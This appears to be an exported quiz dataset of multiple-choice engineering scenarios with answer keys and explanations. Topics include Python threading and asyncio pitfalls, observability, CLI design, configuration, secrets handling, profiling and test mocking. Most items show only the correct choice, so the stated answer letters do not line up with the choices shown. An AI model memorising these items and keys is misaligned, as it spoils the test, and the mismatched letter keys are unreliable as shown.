scenarios.prompt: What happened, and what is the minimal fix?
choices: Race condition: counter += 1 is read-modify-write — three bytecodes. Threads interleave (both read 5, both write 6), losing updates. Minimal fix: a lock around the increment — or better, avoid sharing (each thread counts locally, sum at the end). The shortfall's randomness is the race signature.
scenarios.why: The correct answer is B. The GIL protects bytecode atomicity, not operation atomicity: += compiles to multiple bytecodes, and threads switch between them. The lost updates are silent — no error, just wrong numbers. Fixes in order of preference: don't share (local counts + sum), then lock, then atomic types. The nondeterminism (different wrong answer each run) diagnoses races.
scenarios.hint: Is counter += 1 one operation or three?
evidence: Read-modify-write isn't atomic. Don't share; or lock; GIL doesn't save you.

scenarios.title: The Dining Philosophers
scenarios.situation: Two threads need locks A and B. Thread 1 takes A then B; thread 2 takes B then A. Sometimes both freeze forever.
scenarios.prompt: What is the deadlock, and the systematic fix?
choices: Use one big lock for everything.

Circular wait: T1 holds A wants B, T2 holds B wants A — Coffman's fourth condition. Systematic fix: global lock ordering — always acquire A before B everywhere. Breaking circular wait breaks the deadlock class, not just this instance.
scenarios.why: The correct answer is C. The 'sometimes' is the Coffman signature: deadlock needs the unlucky interleaving. Lock ordering (a documented global order, enforced by code review or a wrapper) eliminates circular wait systematically. One big lock 'fixes' it by serializing everything — the coarsest correct answer, acceptable when contention is low, wasteful when it's not.
scenarios.hint: What does T1 hold while waiting, and what does T2 hold?
evidence: Global acquisition order kills circular wait. Document it.

scenarios.title: The Unbounded Growth
scenarios.situation: A producer outruns consumers; the unbounded queue grows to 8GB; the OOM killer strikes.
choices: Bounded queue (maxsize) with a full-policy: block the producer (backpressure — slows ingestion to consumption speed) or drop with metrics (shed load deliberately). The queue depth becomes a health metric. Unbounded queues defer the failure to the OOM killer — the worst policy, chosen by default.
scenarios.why: The correct answer is D (index 3). The queue is the shock absorber; unbounded means infinite shock absorption until the machine dies. Bounding converts memory exhaustion into a designed choice: slow down (block) or shed (drop+count). Monitor depth — sustained full means the consumers are undersized, which is now a visible, actionable signal instead of a 3 AM OOM.
scenarios.hint: What policy did the unbounded queue implement when full?
evidence: maxsize + full-policy (block or drop+count). Depth is a metric.

scenarios.title: The Frozen Loop
scenarios.situation: An asyncio server handles 10k connections. One handler calls time.sleep(30) for a retry delay. All 10k connections stall for 30 seconds.
scenarios.prompt: Why, and what is the fix?
choices: The event loop is single-threaded: time.sleep blocks the ONLY thread, freezing every coroutine. Fix: await asyncio.sleep(30) (yields control) — and audit for all blocking calls (requests, open on slow FS, CPU loops). One blocking call stalls everything; that's the async contract.
scenarios.why: The correct answer is A. asyncio's deal: coroutines cooperate by yielding at await points; a blocking call defects — it holds the thread while 10k coroutines wait. The fix is await asyncio.sleep plus a blocking-call audit (run_in_executor for the unavoidable). This is THE asyncio bug; every async codebase has committed it. Linters and code review catch it; production catches it louder.
scenarios.hint: How many threads run the event loop?
evidence: await asyncio.sleep, not time.sleep. Audit blocking calls.

scenarios.title: Threads, Processes, or Async?
scenarios.situation: Three workloads: (a) 500 HTTP fetches, (b) video transcoding, (c) 20k idle websocket connections with occasional messages.
scenarios.prompt: What is the right tool for each?
choices: (a) threads or asyncio — I/O-bound waits overlap; (b) multiprocessing — CPU-bound, needs real parallelism past the GIL; (c) asyncio — massive connection count, mostly idle; threads would drown in stack memory. The workload's wait/compute ratio and connection count decide — not fashion.
scenarios.why: The correct answer is B. The decision tree: waiting? → overlap it (threads/asyncio). Computing? → parallelize it (processes). How many? → 20k connections rules out threads (memory), favors asyncio. (b) with threads would serialize on the GIL — slower than sequential. Match the tool to the physics; each wrong choice fails differently.
scenarios.hint: Is each workload waiting or computing, and how many concurrent?
evidence: I/O waits → threads/asyncio. CPU → processes. Count matters.

scenarios.title: The Hanging Join
scenarios.situation: A producer/consumer pipeline: main puts items, then q.join() — which hangs forever. Consumers are daemon threads processing items.
choices: Completion accounting: every q.get() needs a matching q.task_done(), and consumers need a shutdown signal (sentinels) — otherwise join() waits for task_done calls that never come, or consumers exit without them. The hang's location (join) names the missing piece: the completion protocol.
scenarios.why: The correct answer is C. queue.join() blocks until task_done() is called for every put() — it's a completion barrier, and barriers need both sides: producers put, consumers task_done, shutdown via sentinels so consumers exit cleanly. The hang at join() is diagnostic: the accounting is incomplete. Common variant: exception in worker skips task_done — wrap worker bodies in try/finally.
scenarios.hint: Who calls task_done for each put?
evidence: put/get/task_done/sentinel/join — every piece or it hangs.

scenarios.title: The Retry Storm
scenarios.situation: A dependency flaps for 30 seconds. Every client retries instantly and simultaneously. The dependency recovers — then dies again under the retry avalanche.
choices: Retries are the problem; never retry.

Jittered exponential backoff (spread retries over time), circuit breaker (stop calling the failing dependency — fail fast), and hedging/bulkheads (limit retry concurrency). Instant synchronized retries convert a 30s blip into a self-inflicted DDoS; the defenses desynchronize and bound the retry load.
scenarios.why: The correct answer is D. The storm's physics: N clients × instant retry = N simultaneous hits the moment recovery begins — often re-killing it. Backoff+jitter desynchronizes, circuit breakers shed load during the outage (giving it room to recover), bulkheads cap the retry concurrency. Together they make retries safe. 'Never retry' sacrifices the availability retries exist to provide.
scenarios.hint: What hits the dependency the moment it recovers?

domains.name: Logging & Monitoring
domains.summary: Observability for Python services: structured logging, metrics, health checks, and the practices that make systems operable.

scenarios.title: The Million Series
scenarios.situation: Someone adds user_id as a Prometheus label. Series count explodes to 2M; Prometheus OOMs; monitoring is down during an incident.
scenarios.prompt: What is the rule, and the fix?
choices: Labels are dimensions with bounded values (method, status, route) — never identifiers (user_id, request_id, email). Cardinality multiplies across labels: 5 methods × 4 statuses × 1M users = 20M series. Fix: remove the label, use logs/traces for per-user debugging (that's what they're for). Monitoring down is the worst incident multiplier.
scenarios.why: The correct answer is C. Cardinality is multiplicative and unbounded identifiers make it infinite: each unique user creates new series forever, and old series linger. The pillars have a division of labor — metrics aggregate (bounded labels), logs/traces individualize (request IDs welcome). Violating it kills the monitoring plane, which is how a metrics bug becomes an observability outage.
scenarios.hint: What multiplies when you add user_id: series by methods, or by users?
evidence: Labels: methods, statuses. Never IDs. Logs/traces individualize.

scenarios.title: The DEBUG Flood
scenarios.situation: DEBUG logging is on in production 'temporarily.' Log volume is 50x normal; the aggregator bill triples; the real ERROR is buried in noise.
choices: Levels as a contract: DEBUG off in prod (or sampled/dynamic), INFO for business events, WARNING/ERROR for the actionable. Volume is a cost and a signal-to-noise ratio — noisy logs hide incidents. Dynamic log levels (change per-logger at runtime) give debuggability without the flood.
scenarios.why: The correct answer is D. Log levels are a volume control with cost and clarity implications: DEBUG-everything is the 'print debugging in prod' anti-pattern at scale. The mature setup: INFO baseline, dynamic per-logger levels for targeted debugging (flip payments to DEBUG for 10 minutes), and sampling for high-volume paths. 'Temporarily' in prod is permanent until the bill arrives.
scenarios.hint: What is the signal-to-noise ratio of 50x DEBUG volume?
evidence: DEBUG off in prod. Dynamic levels for targeted debugging.

scenarios.title: The Restart Storm
scenarios.situation: Liveness probe checks the database. The DB has a 2-minute blip. Kubernetes restarts every pod; the restart storm extends the outage by 20 minutes.
choices: Liveness must never check dependencies: the DB blip made every pod 'unhealthy,' and restarts can't fix a downstream outage — they amplify it (cold caches, connection storms). Liveness = 'is the process stuck?' (local only). Readiness = 'should I get traffic?' (may check deps). The probe types have different jobs.
scenarios.why: The correct answer is A. This is the canonical liveness/readiness confusion with a production price tag: 2 minutes of DB trouble became 20 minutes of cascading restarts. Liveness answers 'should this container be killed?' — killing doesn't fix dependencies. Readiness answers 'should this get traffic?' — shedding load during the blip is correct. The misconfiguration turned a blip into an outage.
scenarios.hint: Does restarting the pod fix the database?
evidence: Liveness: local only. Readiness: may check deps. Never swap them.

scenarios.title: The Three-System Mystery
scenarios.situation: A request fails across three services. Each service's logs use different request IDs (or none). Debugging takes 4 hours of timestamp-correlation.
choices: Propagated correlation IDs: one request ID generated at ingress, forwarded in headers, included in every log record across all services. The 4 hours were join-key reconstruction by hand — the ID makes it a filter. This is table stakes for distributed systems; without it, every incident is archaeology.
scenarios.why: The correct answer is B. Centralized logging without correlation IDs is a bigger haystack, not a magnet: you still can't isolate one request's path. The ID must be generated once (ingress), propagated everywhere (headers, queues, subprocess env), and logged always. The cost is tiny (one header); the 4-hour incidents are the price of skipping it.
scenarios.hint: What joins one request's logs across three services?
evidence: Generate at ingress, propagate everywhere, log always.

scenarios.title: The Untested Alert
scenarios.situation: An alert never fired — misconfigured threshold. The outage it was meant to catch burned for 3 hours before a user reported it.
scenarios.prompt: What practice would have caught the misconfiguration?
choices: Alert testing: deliberately trigger the condition in staging (inject errors, watch the page). The monitoring chain (metric → rule → notification → human → runbook) has five links; untested chains break silently. 'The alert exists' is not 'the alert works.'
scenarios.why: The correct answer is C (index 2). Every untested alert is Schrödinger's monitoring — configured but unknown-working. The staging fire drill verifies the full chain including the human and runbook. Threshold tuning without testing is guessing; the drill converts guesses into verified behavior. Users-as-monitors is the most expensive alerting system ever built.
scenarios.hint: How do you know the alert works: config review or a fired test?
evidence: Fire alerts on purpose in staging. Verify metric→page→human.

scenarios.title: The Grep-Only Logs
scenarios.situation: Logs are free-text prose: 'Processing failed for user 123 after 3 tries (timeout?)'. Debugging requires regex archaeology; dashboards can't parse them.
scenarios.prompt: What is the fix, and why does it matter?
choices: Logs are for humans; keep prose.

Structured logging (JSON with fixed fields): event names, durations as numbers, IDs as fields — queryable by the aggregator, dashboardable, alertable. Prose is for humans reading one line; structure is for machines reading millions. The '?' in the log line is the tell: even the author wasn't sure.
scenarios.why: The correct answer is D. The scale argument: you don't read logs, you query them — and queries need fields. Structured events turn 'find the slow ones' into a filter (duration_ms > 500) instead of a regex project. The human-readability concern is solved by formatters (pretty-print in dev, JSON in prod). Unstructured logs are write-only at scale.
scenarios.hint: Do you read logs or query them?
evidence: JSON with fixed fields. Queryable beats readable at scale.

scenarios.title: The Deep Health Check
scenarios.situation: The /health endpoint runs a full diagnostic: DB query, cache ping, downstream calls. Under load, health checks themselves overload the dependencies.
choices: Health checks must be cheap and shallow: the endpoint's job is 'alive and basically well,' not a systems audit. Deep checks under load become a self-inflicted DDoS (every load balancer polling every second × expensive diagnostics). Keep /live trivial, /ready shallow; put deep diagnostics in a separate admin endpoint polled rarely.
scenarios.why: The correct answer is A. Health check traffic scales with infrastructure (LBs, orchestrators all poll), so expensive checks multiply into real load — the observer becomes the outage. The layering: /live (trivial), /ready (shallow dep ping with short timeout), /diagnostics (deep, admin-only, rare). A health check that can cause the outage it's meant to detect is worse than none.
scenarios.hint: What happens when 100 pollers run your diagnostic every 5 seconds?
evidence: /live trivial, /ready shallow. Deep diagnostics go elsewhere.

domains.name: CLI Development
domains.summary: Building command-line tools people love: argument parsing, UX, output design, and distribution.

scenarios.title: The Broken Pipeline
scenarios.situation: A tool prints progress bars to stdout. Users pipe it to jq — and jq chokes on the progress output mixed with JSON results.
choices: Results to stdout, chatter to stderr: the tool mixed human progress with machine results on the same stream. Fix: progress to stderr (rich does this by default), results (JSON) to stdout only. The stream contract is what makes Unix composition work — violating it breaks every downstream consumer.
scenarios.why: The correct answer is D. The stdout contract: parseable results only. Progress, logs, and chatter go to stderr — they're for humans watching, not machines consuming. This isn't aesthetics; it's the composability guarantee that makes `tool --json | jq` work. Every CLI that will ever be scripted must honor it from day one.
scenarios.hint: Which stream is the API, and which is the UI?
evidence: Results: stdout. Chatter: stderr. Pipes depend on it.

scenarios.title: The ps Password
scenarios.situation: A CLI takes --password for the DB. An admin runs it on a shared host; another user runs ps aux and reads the password.
choices: Never secrets as flags: read from env vars (APP_DB_PASSWORD), prompt securely (getpass), or read from a file with tight permissions. Command lines are visible via ps, stored in shell history, and logged by audit — they're the most public 'private' channel. The flag was convenient and catastrophically exposed.
The shared host is the problem.
It's fine; ps output is trusted.
scenarios.why: The correct answer is A. The command line is public by design: /proc/<pid>/cmdline is world-readable, history files persist, audit logs record. Secrets need channels with access control — env vars (still visible in /proc/environ, but better), prompts (never stored), or files (0o600). The convenience of --password is never worth the exposure.
scenarios.hint: Who can read a command line?
evidence: Env, prompt, or file. Command lines are public.

scenarios.title: The Unverified Destroy
scenarios.situation: A cleanup CLI deletes old data. No --dry-run. An operator mistypes a filter; production data is deleted.
scenarios.prompt: What interface was missing, and what else?
choices: --dry-run (show what would happen — the verification step), plus confirmation for destructive ops, plus the filter echoed back before acting. Destructive CLIs need a 'read back what you understood' step: the operator verifies the tool's understanding, not just their typing. Backups are the last resort, not the plan.
scenarios.why: The correct answer is B. Destructive operations need a verification loop: dry-run shows the blast radius, confirmation gates the action, echoing the parsed filter catches misreading. 'Better operators' doesn't scale; interface design does. The rm -rf horror stories all share this shape — power without a preview.
scenarios.hint: What would have shown the operator their mistake before deletion?

scenarios.title: The Missing Help
scenarios.situation: A tool has 12 subcommands, no --help text, and flags named -x, -y, -z. New team members can't use it; the author is the support channel.
choices: New members should read the code.

Help-first design was skipped: the interface was never designed, just accreted. Fix: write --help for every command (it forces interface clarity), rename flags descriptively, add examples. If the help is confusing, the interface is wrong — the help-writing process IS the design review.
scenarios.why: The correct answer is C (index 2). Undocumented flags don't exist for anyone but the author — the tool's bus factor is 1. Writing help text is a design forcing function: explaining -x forces you to realize -x is a bad name. The support-channel pattern (author as docs) doesn't scale; help text does. This is why Typer/Click generate from docstrings — docs that can't rot.
scenarios.hint: If you can't explain the flag, is it a good flag?
evidence: Write --help before implementation. Confusing help = wrong interface.

scenarios.title: The Lying Exit Code
scenarios.situation: A backup script always exits 0 — even on failure. The orchestrator reports 'backup succeeded' nightly. The backups have been failing for a month.
choices: Exit codes as API: the script lied about its outcome, so every consumer (orchestrator, monitoring, the next script in the chain) made decisions on false data. Fix: meaningful exit codes (0/1/2+documented), and the orchestrator should verify (check the backup artifact exists). Silent success is the most dangerous failure mode.
scenarios.why: The correct answer is D. Exit codes are the composition contract: scripts chain via &&, orchestrators via status. Always-0 breaks the chain's information flow — failures become invisible, and 'succeeded' dashboards lie for a month. The fix is honesty at the source plus verification at the consumer (trust but verify the artifact). Both layers; the lying was the root.
scenarios.hint: What did the orchestrator believe for a month?
evidence: Exit codes are API. Always-0 is lying to every consumer.

scenarios.title: The Precedence Puzzle
scenarios.situation: A user sets timeout in the config file, but the tool uses 30s. Debugging reveals: an env var from an old session overrides the file. The user didn't know env vars outranked the file.
choices: Documented precedence: flags > env > file > defaults — stated in --help and docs. The behavior was correct per the chain; the user couldn't predict it because the chain was secret. Configuration precedence is a contract — publish it, and echo the effective config (logship config --show) so users see what won.
scenarios.why: The correct answer is A. Precedence disputes are always documentation failures: every chain is defensible, but an unpublished chain is unpredictable. The --show-effective-config command is the debugging tool — it ends 'why is it using 30s?' in one invocation. Stale env vars are the classic gotcha; visibility is the fix.
scenarios.hint: How does the user see which source won?

scenarios.title: The Redesigned Output
scenarios.situation: v2.0 renames JSON fields. Three consumer scripts break silently (they read the old fields, get nulls, produce wrong reports).
choices: JSON is the problem; use tables.

Versioned machine output: --json includes a schema version; field renames bump it; breaking changes get migration notes. Machine output is an API — it follows API rules (deprecation, versioning, changelogs). Silent renames are breaking changes shipped as patches.
scenarios.why: The correct answer is B. The moment a script consumes your --json, it's an API with compatibility obligations. Version the schema, deprecate before removing, document migrations. 'Never change' ossifies; 'change silently' breaks — versioning is the middle path. Human output can churn; machine output is a contract.
scenarios.hint: When did the JSON become an API?
evidence: Schema version, deprecation, changelog. It's an API.

domains.name: Configuration Management
domains.summary: Twelve-factor config, validation, secrets, feature flags, and environment discipline.

scenarios.title: The Committed Secret
scenarios.situation: A database password is committed to the repo. It's removed in the next commit. The team considers it handled.
choices: Git history never forgets: the secret lives in the earlier commit forever, and scanners copy repos in seconds. Removal ≠ revocation. The response: rotate the credential immediately (it's compromised), purge history if feasible (BFG), and add pre-commit secret scanning so it can't recur. The commit is the exposure; the rotation is the fix.
scenarios.why: The correct answer is A. 'Removed' from HEAD is not removed from history — every clone has it. Secret scanners (attackers run them too) find committed secrets in minutes. The incident response is rotation first (assume compromised), then prevention (pre-commit hooks, secret scanning in CI). This is the most common secret leak vector because it feels fixed when it isn't.
scenarios.hint: Who has a copy of the old commit?
evidence: Committed secret = compromised. Rotate + scan + pre-commit.

scenarios.title: The Debug Flag in Prod
scenarios.situation: DEBUG=true is set in production 'temporarily' for an investigation. It's forgotten. Log volume explodes; PII lands in the aggregator.
choices: DEBUG is fine; the volume is the issue.

No expiry on the temporary change, and no guardrail preventing debug-in-prod (or PII in logs). Fix: temporary config changes need TTLs/tickets, debug modes need explicit prod-safety review, and PII should never be loggable — structure logs to exclude it by design. 'Temporary' without a deadline is permanent.
Debugging in prod is always wrong.
scenarios.why: The correct answer is B. Every 'temporary' production change needs a revert mechanism (TTL, ticket, alert) — otherwise it's permanent. And the PII exposure is the deeper failure: log schemas should exclude sensitive fields structurally, not by hoping DEBUG stays off. Defense in depth: time-bound the change AND make the dangerous state hard to reach.
scenarios.hint: What reverts the temporary change?
evidence: Every temp change gets a deadline + ticket. PII never loggable.

scenarios.title: The Snowflake Prod
scenarios.situation: Production has config keys that don't exist in stage. A deploy works on stage, fails on prod: the code reads a key only prod defines.
choices: The code should handle missing keys.

Schema parity across environments: same keys everywhere, different values. CI validates the schema per environment (all required keys present, no extras). 'Works on stage' requires stage to BE prod-like — schema drift voids the proof. The extra key was a latent deploy bug.
scenarios.why: The correct answer is C. Staging's value is proving what prod will do; schema drift breaks the proof. The fix is mechanical: one schema, validated per environment in CI, with values differing by environment. 'Copy prod to stage' inverts the model (and leaks prod secrets); the schema is the contract, values are the variables.
scenarios.hint: What did stage prove about prod?
evidence: Same keys everywhere, values vary. CI validates per env.

scenarios.title: The Flag That Bit
scenarios.situation: A two-year-old flag, default False, is removed in a 'cleanup.' Production breaks: one critical path still checked the flag, defaulting wrong without it.
choices: Flag lifecycle: every flag needs owner, remove-by date, and — critically — removal means deleting the CODE PATH, not just the flag. The cleanup removed the switch but left the branch; the branch's default behavior was never the tested behavior. Flags are removed by deleting code, verified by tests.
The flag should have defaulted True.
scenarios.why: The correct answer is D (index 3). The bug: removing the flag left `if flag` → `if False` → dead code path that was actually live. Proper flag removal: delete the flag AND the obsolete branch, keeping the live path — with tests proving the live path. The graveyard problem (stale flags) and the removal problem (botched cleanup) are the two ends of flag hygiene; both need the lifecycle discipline.
scenarios.hint: What did 'removing the flag' actually leave behind?
evidence: Flag removal = delete branch + tests. Not just the switch.

scenarios.title: The Stale Env Var
scenarios.situation: An old SESSION_KEY env var from a debugging session overrides the config file's new key. The app uses the stale value for a week before anyone notices.
choices: Visibility (effective-config command showing which source won) and hygiene (documented precedence + env hygiene — clean up debugging vars). The week-long invisibility is the real bug: config resolution should be inspectable in one command, so 'which value is active?' is never a mystery.
scenarios.why: The correct answer is A. Every precedence chain has this failure mode — a forgotten override silently winning. The fixes are observability (show-effective-config makes the winner visible) and process (documented chain + cleaning up after debugging). 'Ban env vars' throws away 12-factor; the chain is fine, the invisibility isn't.
scenarios.hint: How long was the wrong value active, and how would you know?

scenarios.title: The Unrotatable Secret
scenarios.situation: A database password can't be rotated: it's embedded in 12 config files, 3 scripts, and 2 dashboards. Rotation means a week-long project.
scenarios.prompt: What design would have made rotation trivial?
choices: The secret is fine; don't rotate.

Single source + reference pattern: the secret lives in ONE manager; configs reference it (vault://...); apps resolve at startup and reload on signal. Rotation = update manager + signal apps. Embedded-in-N-places is the unrotatable shape; the reference pattern makes N irrelevant.
scenarios.why: The correct answer is B. Rotation cost is a function of secret sprawl: each embedding is a rotation step. The reference architecture collapses N embeddings to 1 source — rotation touches the manager, apps pick it up via reload. 'Rotate less often' accepts the risk; the design removes the cost. This is why secret managers exist.
scenarios.hint: How many places must change to rotate?
evidence: Reference pattern: N embeddings → 1 manager. Rotation becomes trivial.

scenarios.title: The 3 AM Typo
scenarios.situation: A config typo (timeot instead of timeout) deploys. The app ignores the unknown key, uses the default 30s — but the intended 300s mattered. The incident burns for hours.
choices: Strict schema validation: reject unknown keys (typos become startup errors, not silent defaults) and validate values (ranges, formats). 'Ignore unknown keys' is the typo-forgiveness that causes 3 AM incidents. Fail fast at startup with the key named — the deploy fails, not the night.
scenarios.why: The correct answer is C. Lenient config parsing ('ignore what you don't understand') trades deploy-time errors for runtime mysteries. Strict mode — unknown keys rejected, values validated — converts the typo into a failed deploy, which is the cheapest possible failure. The error message does the UX: name the key, show valid keys, suggest the fix.
scenarios.hint: When should the typo have failed: deploy or 3 AM?
evidence: Reject unknown keys. Typos fail at deploy, not at 3 AM.

domains.name: Performance Profiling
domains.summary: Finding what's slow: measurement, cProfile, memory profiling, and honest optimization.

scenarios.title: The Wrong Function
scenarios.situation: A developer spends a week optimizing the JSON parser. Production latency doesn't move. Profiling later shows the parser is 2% of request time; the database is 80%.
scenarios.prompt: What is the discipline that was skipped?
choices: Profile before optimizing: the week optimized a non-bottleneck. Amdahl's law said the max win was 1.02x — the profiler would have pointed at the database on day one. 'Slow' feelings are not measurements; the cumulative-time sort is.
scenarios.why: The correct answer is B. The failure wasn't effort but targeting: optimization without measurement optimizes guesses. The profiler's cumulative sort names the bottleneck in minutes; the week was spent on a 2% fraction. This is the most common performance failure mode — not bad optimization, but optimization of the wrong thing.
scenarios.hint: What fraction of runtime was the parser?
evidence: Profile before optimizing. Optimize the dominant fraction.

scenarios.title: The Nested Loop
scenarios.situation: A matching function is O(n²): for each of 100k items, scan a 100k list. It takes hours. Micro-optimizations shave 10%.
choices: Change the complexity: index the list into a set/dict (O(1) lookups) → O(n) total. Micro-optimization on O(n²) fights the exponent; the data structure change removes it. 10% off hours is still hours; O(n) is seconds.
scenarios.why: The correct answer is C. Complexity dominates constants: no amount of 10% wins fixes a quadratic. The set/dict index is the standard move — and the profiler-plus-complexity-lens is how you spot it (hot loop + membership test = the pattern). Hardware and interpreters give constant factors; algorithms give exponents.
scenarios.hint: What grows: the constant or the exponent?
evidence: O(n²)→O(n) beats 10% micro-wins. Index the lookup.

scenarios.title: The Growing Worker
scenarios.situation: A worker's memory grows 100MB/day. Restarts 'fix' it. The team restarts nightly via cron.
choices: Find the leak with tracemalloc diffs: snapshot, workload, snapshot, diff — the growing allocation names it (usually an unbounded cache/listener). Cron restarts treat the symptom; the leak is still there, growing between restarts. 'Restart nightly' is the confession, not the fix.
scenarios.why: The correct answer is D. The nightly restart is operational debt: it bounds the damage while the leak continues. tracemalloc's snapshot diff finds the culprit in minutes — unbounded structures are the usual suspects, each needing a size policy. Leaks are bugs with a distinctive signature (monotonic growth); measure, don't restart.
scenarios.hint: Is the restart a fix or a confession?
evidence: tracemalloc compare finds growth. Restarts hide leaks.

scenarios.title: The 4x That Wasn't
scenarios.situation: CPU-bound work is threaded across 8 cores. Speedup: 1.0x. The team adds more threads: 1.0x.
scenarios.prompt: What is the ceiling, and the way through?
choices: The GIL: CPython threads serialize bytecode — 8 threads, one executing. More threads can't help; the way through is multiprocessing (separate interpreters), native extensions (GIL released), or free-threaded Python (3.13+, thread-safe code). The flat speedup curve IS the diagnosis.
scenarios.why: The correct answer is A (index 0). The 1.0x-at-any-thread-count is the GIL's fingerprint: contention, not work, scales. The escape routes each have costs (multiprocessing: pickling; native: complexity; free-threading: ecosystem readiness) — but all beat adding threads to a serialized workload. Recognizing the ceiling saves the team from infinite thread-tuning.
scenarios.hint: What scales with thread count: work or contention?

scenarios.title: The Endless Tuning
scenarios.situation: p99 is 300ms; SLO is 500ms. An engineer keeps optimizing: 280ms, 260ms... Each change adds complexity and risk.
choices: Now: SLO met with headroom = done. Further optimization has negative ROI — complexity risk exceeds speed value, and the time belongs to the next bottleneck (or feature). 'Fast enough' is the engineering decision; endless tuning is gold-plating with incident potential.
scenarios.why: The correct answer is B. Optimization needs a stop condition or it's infinite: the SLO plus headroom defines 'done.' Every further change risks correctness for unneeded speed — and the opportunity cost (other bottlenecks, features, reliability work) is real. Senior engineers stop; juniors polish. The discipline is economic, not aesthetic.
scenarios.hint: What is the ROI of 300ms → 260ms against a 500ms SLO?
evidence: Met + headroom = done. Further tuning has negative ROI.

scenarios.title: The Wrong Profiler
scenarios.situation: cProfile shows everything fast, but requests take 2 seconds. The team optimizes functions; nothing helps.
choices: The code is fine; it's the network.

I/O waits: cProfile measures CPU time in functions, but the 2 seconds are spent WAITING (network, disk, locks) — invisible to CPU profilers. Use wall-clock tools (py-spy, asyncio debug, tracing) that show where time elapses, not just where CPU burns. The profiler must match the bottleneck's physics.
scenarios.why: The correct answer is C. CPU profilers answer 'where does CPU go?'; I/O-bound slowness needs 'where does TIME go?' — wall-clock sampling (py-spy), async task analysis, or distributed tracing. Optimizing functions for a waiting problem is the tool-mismatch failure. Diagnose the physics first (CPU-bound or waiting?), then pick the profiler.
scenarios.hint: Is the request computing or waiting?
evidence: CPU profilers miss waits. Wall-clock for I/O-bound.

scenarios.title: The Poisoned Cache
scenarios.situation: lru_cache speeds up a function 100x. Then a bug: the function reads a config file, but the cache serves stale config after changes. Also, memory grows.
scenarios.prompt: What are the two cache rules violated?
choices: Purity (cache only pure functions — same args, same result; config-reading is impure) and bounds (maxsize set, else unbounded growth). The fix: cache the pure computation, not the I/O; set maxsize; add invalidation (TTL or explicit clear on config change). Caching is a correctness decision wearing a performance costume.
scenarios.why: The correct answer is D. lru_cache assumes purity and benefits from bounds: impure functions (I/O, time, randomness) cached give stale wrongness; unbounded caches grow forever. The 100x win was real — the bug was caching the wrong layer. Cache the pure core, keep I/O outside, bound the size, plan invalidation. Every cache needs an invalidation story.
scenarios.hint: Was the cached function pure?
evidence: Pure functions only, maxsize set, invalidation planned.

domains.name: Testing Systems
domains.summary: pytest in depth, mocking boundaries, integration tests, fixtures, and testing the untestable.

scenarios.title: The Vacuous Pass
scenarios.situation: A test patches 'requests.get' but the module does 'from requests import get'. The test passes — always, even with broken code.
scenarios.prompt: Why is it vacuous, and what is the rule?
choices: Wrong patch target: the module bound the name 'get' in ITS namespace; patching 'requests.get' replaces the attribute on the requests module, not the module's local binding. The mock never intercepts; the real get runs (or the test asserts nothing real). Rule: patch where it's looked up ('mymodule.get'), not where it's defined.
scenarios.why: The correct answer is C. Python's import binds names in the importing namespace: 'from requests import get' creates mymodule.get, independent of requests.get afterwards. Patching must target the USE site. The vacuous pass is the worst outcome — green tests proving nothing. Deliberately break the code after mocking: if the test still passes, the mock is wrong.
scenarios.hint: Which namespace does the module actually call?
